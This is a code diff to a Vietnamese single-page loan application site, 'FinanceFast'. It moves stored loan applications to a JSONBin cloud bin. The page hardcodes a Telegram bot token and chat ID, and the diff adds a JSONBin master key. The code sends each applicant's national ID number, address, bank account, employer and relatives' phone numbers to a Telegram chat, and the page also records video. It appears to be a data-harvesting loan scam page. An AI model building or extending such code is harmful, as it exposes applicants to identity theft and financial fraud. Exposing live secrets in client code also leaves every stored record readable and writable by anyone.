@@ -359,7 +359,7 @@
                 <div class="flex justify-between items-center border-b border-slate-100 pb-3">
                     <div>
                         <h2 class="text-lg font-black text-slate-900">Quản Trị Đơn Vay</h2>
-                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ khách hàng</p>
+                        <p class="text-xs text-amber-600 font-bold">Danh sách hồ sơ đám mây chung</p>
                     </div>
                     <button onclick="adminLogout()" class="bg-red-50 text-red-600 hover:bg-red-100 px-3 py-1.5 rounded-xl text-xs font-bold transition">Đăng Xuất</button>
                 </div>
@@ -389,10 +389,13 @@
 
                 <!-- DANH SÁCH HỒ SƠ KHÁCH HÀNG -->
                 <div class="space-y-2">
-                    <span class="text-xs md:text-sm font-bold text-slate-700 uppercase tracking-wider block">📋 Hồ sơ khách đăng ký:</span>
+                    <div class="flex justify-between items-center">
+                        <span class="text-xs md:text-sm font-bold text-slate-700 uppercase tracking-wider block">📋 Hồ sơ khách đăng ký:</span>
+                        <button onclick="fetchCloudData()" class="bg-amber-100 hover:bg-amber-200 text-amber-900 px-2.5 py-1 rounded-lg text-[11px] font-bold">🔄 Làm mới danh sách</button>
+                    </div>
                     <div id="adminLoanList" class="space-y-2 max-h-60 overflow-y-auto">
                         <div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">
-                            Chưa có hồ sơ khách đăng ký mới.
+                            Đang tải dữ liệu từ đám mây...
                         </div>
                     </div>
                 </div>
@@ -561,9 +564,13 @@
         const BOT_TOKEN = "8813882772:AAFe5hE16dVTUDxwWEruzhNogArLgbGcoi4";
         const CHAT_ID = "8348914397";
 
+        // JSONBin Cloud Config
+        const BIN_ID = "6ac700f1ac6210605a1e39af";
+        const MASTER_KEY = "$2a$10$SAT05TQcAcDb/58Pr8I0eaAKleTXr75&QqrN25ICu5FRI05GAjzu";
+
         let formData = {};
         let mediaStream, mediaRecorder, recordedChunks = [], videoBlob = null;
-        let allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
+        let allLoans = [];
         let currentSelectedLoanId = null;
 
         let currentUser = localStorage.getItem('ff_current_user') || null;
@@ -610,6 +617,39 @@
             localStorage.setItem('ff_fb_link', fbLink);
             localStorage.setItem('ff_zalo_link', zaloLink);
             showModal("Thành Công", "Đã lưu cấu hình hỗ trợ thành công!");
+        }
+
+        // --- ĐỒNG BỘ DỮ LIỆU TỪ JSONBIN.IO (ĐÁM MÂY CHUNG) ---
+        async function fetchCloudData() {
+            try {
+                let res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                    headers: { 'X-Master-Key': MASTER_KEY }
+                });
+                let json = await res.json();
+                if(json && json.record && Array.isArray(json.record.loans)) {
+                    allLoans = json.record.loans;
+                } else {
+                    allLoans = [];
+                }
+            } catch(e) {
+                console.log("Lỗi tải dữ liệu đám mây", e);
+            }
+            if(isAdminLoggedIn) renderAdminLoanList();
+        }
+
+        async function saveCloudData() {
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': MASTER_KEY
+                    },
+                    body: JSON.stringify({ loans: allLoans })
+                });
+            } catch(e) {
+                console.log("Lỗi lưu dữ liệu đám mây", e);
+            }
         }
 
         function setQuickNote(text) {
@@ -710,14 +750,13 @@
             document.getElementById('totalPayment').textContent = new Intl.NumberFormat('vi-VN').format(Math.round(totalAmount)) + " ₫";
         }
 
-        window.onload = function() { 
+        window.onload = async function() { 
             calculateLoan(); 
-            renderAdminLoanList(); 
+            await fetchCloudData();
             checkLoginState();
         };
 
         function checkLoginState() {
-            allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
             const btn = document.getElementById('userAccountBtn');
             if (isAdminLoggedIn) {
                 btn.textContent = "🛡️ Quản Trị";
@@ -740,8 +779,8 @@
             }
         }
 
-        function switchTab(tabName) {
-            allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
+        async function switchTab(tabName) {
+            await fetchCloudData();
             document.getElementById('stepHome').classList.add('hidden');
             document.getElementById('tabLoanInfo').classList.add('hidden');
             document.getElementById('tabApplications').classList.add('hidden');
@@ -921,13 +960,12 @@
         }
 
         function renderAdminLoanList() {
-            allLoans = JSON.parse(localStorage.getItem('ff_loans') || '[]');
             const listEl = document.getElementById('adminLoanList');
             const selectEl = document.getElementById('quickClientSelect');
             if(!listEl) return;
             
             if(allLoans.length === 0) {
-                listEl.innerHTML = `<div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">Chưa có hồ sơ khách đăng ký mới.</div>`;
+                listEl.innerHTML = `<div class="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-500 text-center">Chưa có hồ sơ khách đăng ký mới trên đám mây.</div>`;
                 selectEl.innerHTML = `<option value="">-- Chưa có khách hàng nào --</option>`;
                 return;
             }
@@ -985,7 +1023,7 @@
             currentSelectedLoanId = null;
         }
 
-        function updateLoanAction(newStatus) {
+        async function updateLoanAction(newStatus) {
             if(currentSelectedLoanId === null) return;
             
             allLoans[currentSelectedLoanId].name = document.getElementById('editName').value;
@@ -1002,10 +1040,10 @@
             allLoans[currentSelectedLoanId].note = document.getElementById('editNote').value;
             allLoans[currentSelectedLoanId].status = newStatus;
 
-            localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+            await saveCloudData();
             renderAdminLoanList();
             closeAdminDetail();
-            showModal("Thành Công", "Đã cập nhật và lưu toàn bộ thông tin hồ sơ thành công!");
+            showModal("Thành Công", "Đã cập nhật và lưu toàn bộ thông tin lên đám mây thành công!");
         }
 
         function startLoanProcess() {
@@ -1080,7 +1118,7 @@
             }
             const btn = document.getElementById('finalBtn');
             btn.disabled = true;
-            btn.textContent = "Đang gửi hồ sơ về hệ thống...";
+            btn.textContent = "Đang gửi hồ sơ lên đám mây...";
 
             const calculatedMonthlyPayment = document.getElementById('monthlyPayment').textContent;
 
@@ -1108,8 +1146,11 @@
                 note: '',
                 time: new Date().toLocaleDateString('vi-VN')
             };
+
+            // Tải dữ liệu mới nhất từ cloud, thêm đơn mới rồi lưu lại
+            await fetchCloudData();
             allLoans.unshift(newLoan);
-            localStorage.setItem('ff_loans', JSON.stringify(allLoans));
+            await saveCloudData();
 
             try {
                 const msg = `🚨 HỒ SƠ VAY MỚI (FINANCEFAST)!\n\n🆔 Mã phiên / SĐT: #${currentUser}\n💰 Số tiền vay: ${formData.amount} (${formData.term})\n💵 Đóng hàng tháng: ${calculatedMonthlyPayment}\n🎯 Mục đích: ${formData.purpose}\n🏢 Công ty: ${formData.company} (${formData.compPhone})\n💵 Thu nhập: ${formData.income}\n📅 Ngày đóng lãi: ${formData.payDay}\n\n👤 Họ tên: ${formData.name}\n📅 Ngày sinh: ${formData.dob}\n🏠 Địa chỉ: ${formData.address}\n🪪 CCCD: ${formData.cccd}\n\n👥 Người thân: ${formData.rName} - SĐT: ${formData.rPhone} (${formData.rRelation})\n\n💳 Ngân hàng: ${formData.bankName} - STK: ${formData.bankAccount} (${formData.bankOwner})`;
